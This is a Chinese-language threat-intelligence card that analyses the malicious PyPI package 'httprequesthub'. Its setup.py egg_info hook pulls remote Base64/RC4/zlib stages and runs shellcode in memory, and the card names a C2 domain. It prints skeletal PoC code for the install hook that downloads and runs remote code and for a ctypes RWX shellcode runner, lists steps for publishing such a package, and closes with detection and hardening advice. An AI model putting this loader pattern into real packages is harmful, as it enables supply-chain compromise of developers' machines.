---
id: cloud-cicd-pypi-egg-info-multistage-fileless-shellcode
title: PyPI 投毒包自定义 egg_info 命令触发多阶段无文件 shellcode：base64 远程加载 + RWX 内存执行
type: scenario
domain: cloud
path: cloud/ci-cd
technique: pypi-egg-info-multistage-fileless-shellcode
aliases:
- egg_info 命令投毒
- httprequesthub 投毒
- 多阶段无文件 shellcode
- RWX 内存执行供应链
- Python 投毒 shellcode
tags:
- pypi
- supply-chain
- setup-py
- egg-info
- shellcode
- fileless
- rwx
- ctypes
- windows
cve: []
severity: critical
affected_versions: httprequesthub [2.31.0,2.31.0]||[2.31.1,2.31.1]||[2.31.3,2.31.3]||[2.31.4,2.31.4]（恶意包版本）
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V515
  verified_at: '2026-11-11T11:38:49+08:00'
  notes: 已对照原文及图13-20核对：setup.py PostEggInfoCommand(egg_info)、base64 URL 拉取 stage2、subprocess.Popen python -c、stage2 RC4 解密（截图函数名 aRCAwKG0p3，已修正卡片原误写 RCAwcKGp3）、stage3 zlib、stage4 ctypes VirtualAlloc RWX+CreateThread、16 轮至 shellcode_stage17、C2 3478.qt-api-worker-threads.workers.dev，均一致；affected_versions httprequesthub 4 个版本取自原文 db.json；dedup 候选仅 related（install 自定义命令、Fernet 分阶段等），非同链。未复现。
---

## 一句话结论

PyPI 恶意包 `httprequesthub` 在 `setup.py` 中定义自定义 `PostEggInfoCommand(egg_info)` 并绑定为 `cmdclass['egg_info']`，`pip install` 构建元数据时触发 `run()`：先正常完成 egg_info，再从远程拉取 Base64/RC4/zlib 多阶段编码的 Python 代码逐层 `exec`，最终用 `ctypes` 分配 RWX 内存并 `CreateThread` 执行 shellcode；此后连续 16 轮 shellcode 自带解码，全程不在磁盘落盘恶意文件，最终与 C2 域名通信。

## 原理

- **egg_info 钩子**：`cmdclass={'egg_info': PostEggInfoCommand}` 覆盖 setuptools 的 `egg_info` 命令；pip 在构建 sdists/本地源码包元数据时会执行该命令。恶意 `run()` 先调用 `egg_info.run(self)` 让安装正常完成，随后执行攻击逻辑，安装日志与业务无异常。
- **多阶段远程加载**：
  - 第一阶段：`run()` 中 `urllib.request.urlopen(base64.b64decode(<编码 URL>).decode())` 拉取 Base64 内容，`subprocess.Popen(['python','-c', base64.b64decode(response.read()).decode()])` 启动第二阶段（新进程、独立于安装器）。
  - 第二阶段：从 gist 等代码托管平台拉 Base64 代码，用自定义 `aRCAwKG0p3`（RC4 类流密码，密钥硬编码）解密后 `exec` 第三阶段。
  - 第三阶段：`zlib.decompress(base64.b64decode(...))` 解出第四阶段。
  - 第四阶段：`ctypes` 调用 `VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)` 分配 RWX 内存，`memmove` 写入解密后的 shellcode，`CreateThread` 执行；随后 `WaitForSingleObject` 等待线程。
- **Shellcode 自解码链**：第五阶段的 `shellcode_stage1` 在内存中再次分配 RWX、按 `xor_key` 解码自身，执行下一段；原文分析需要连续 16 轮解码才得到真实载荷 `shellcode_stage17`，最终 `strcpy` C2 域名 `3478.qt-api-worker-threads.workers.dev`、拼接 `/update` 等路径进行通信。
- **为什么用多阶段**：包内只留解码器/占位逻辑，真实载荷与 C2 配置放在 gist 等白名单平台并可随时替换；每一层编码（Base64/RC4/zlib）都让静态扫描难以提取有效特征；shellcode 内存执行避免恶意文件落盘，绕过基于文件的杀软/EDR 检测。
- **触发前提**：pip 走 sdist 构建（执行 setup.py）；`os.name == 'nt'` 分支（Windows 目标）；主机可出站访问 gist 与 C2 域名。

## 触发条件

- `pip install httprequesthub`（或依赖解析到该包），且使用 sdist/源码构建路径（有 wheel 时不一定执行 setup.py）。
- Windows 环境（代码按 `os.name == 'nt'` 分支执行）。
- 安装进程可出站访问 gist/代码托管与最终 C2 域名。
- 目标 Python 环境允许 `ctypes` 与进程/线程创建（默认允许）。

## 利用步骤

1. 发布恶意包，`setup.py` 定义 `class PostEggInfoCommand(egg_info)` 并绑定 `cmdclass`；`run()` 内先 `egg_info.run(self)`。
2. 第一阶段从 Base64 编码的 URL 拉取第二阶段代码，`subprocess.Popen(['python','-c', ...])` 执行。
3. 第二阶段从代码托管平台拉 Base64 密文，用硬编码密钥的 RC4 变体解密并 `exec` 第三阶段。
4. 第三阶段 `zlib.decompress(base64.b64decode(...))` 解出第四阶段。
5. 第四阶段用 `ctypes` 分配 RWX 内存，写入 shellcode 并用 `CreateThread` 执行；shellcode 再经 16 轮自解码到达最终载荷。
6. 最终 shellcode 与 C2 域名（`<随机前缀>.qt-api-worker-threads.workers.dev`）通信，执行远控/窃密指令。

## PoC

`setup.py` 自定义 egg_info 命令（结构示意，URL 用占位）：

```python
import os
from setuptools import setup
from setuptools.command.egg_info import egg_info
import base64, subprocess, urllib.request

class PostEggInfoCommand(egg_info):
    def run(self):
        egg_info.run(self)
        if os.name == 'nt':
            url = base64.b64decode(b"<base64 编码的 stage2 URL>").decode()
            with urllib.request.urlopen(url) as r:
                code = base64.b64decode(r.read()).decode()
            subprocess.Popen(['python', '-c', code])

setup(name='httprequesthub', version='2.31.4',
      cmdclass={'egg_info': PostEggInfoCommand})
```

`ctypes` 执行 shellcode（第四阶段核心，结构示意）：

```python
import ctypes
from ctypes import wintypes

kernel32 = ctypes.windll.kernel32
shellcode = bytes.fromhex("<解密后的 shellcode>")
mem = kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)  # RWX
ctypes.memmove(mem, shellcode, len(shellcode))
thread = kernel32.CreateThread(None, 0, mem, None, 0, None)
kernel32.WaitForSingleObject(thread, 0xFFFFFFFF)
```

## 变体与关联

- 变体：自定义命令可换 `install`/`build_py`/`develop`，或直接在 setup.py 顶层执行；编码层可换成 Fernet、XOR、多轮 Base64；托管可换任意代码托管/对象存储。
- 变体：最终载荷不一定是 shellcode，也可为 Python 反射加载 PE、PowerShell 等；内存执行的关键是 `VirtualAlloc RWX + CreateThread`（Windows）或 `mmap PROT_EXEC`（Linux）。
- 关联：[[cloud-cicd-pypi-setup-py-custom-install-command-remote-bash]]（cmdclass install 下载远程脚本）、[[cloud-cicd-pypi-multiplerequests-setup-py-cstealer]]（setup.py 顶层 exec 两阶段窃密）、[[cloud-cicd-pypi-fernet-encrypted-staged-loader]]（Fernet 分阶段加载）。
- 边界：`pip install --only-binary=:all:` 或只用已审 wheel 时不执行 setup.py；EDR 对 Python 进程 `VirtualAlloc` RWX + `CreateThread` 监控可拦截；出口限制到代码托管平台可断链。

## 检测与防御

- 检测：`setup.py` 中出现 `cmdclass={'egg_info': ...}`、`urlopen(base64.b64decode(...))`、`subprocess.Popen(['python','-c',...])` 组合；安装期 python 子进程访问 gist/代码托管平台。
- 检测：Python 进程调用 `VirtualAlloc(PAGE_EXECUTE_READWRITE)` + `CreateThread`/`memmove` 的 API 序列（EDR 重点行为）；进程内存出现高熵 shellcode 段。
- 检测：C2 域名特征——`*.workers.dev` 等 PaaS 子域随机前缀、短时间 `strcpy` 拼接 `/update` 等路径。
- 加固：只允许已审 wheel 与哈希锁定；CI 构建在无出站或白名单网络；对 sdist 的 setup.py 静态审计（含编码字符串解码）；监控 Python 进程的 RWX 内存与远程下载行为。
- 响应：卸载包、隔离主机、封禁 C2 域名、轮换安装主机凭据。
